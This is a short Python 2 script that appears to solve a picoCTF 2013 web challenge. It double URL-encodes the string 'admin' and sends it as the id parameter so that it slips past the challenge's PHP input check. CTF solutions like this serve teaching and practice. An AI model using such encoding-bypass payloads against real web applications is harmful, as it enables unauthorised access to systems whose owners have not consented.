#!/usr/bin/env python

import hackercodecs
import requests

def urlencode(s):
	ret = ''
	for l in s:
		ret += '%' + hex(ord(l))[2:]
	return ret

payload = urlencode(urlencode('admin'))

target = 'https://2013.picoctf.com/problems/php2/index.php?id='

r = requests.get(target + payload)
print r.content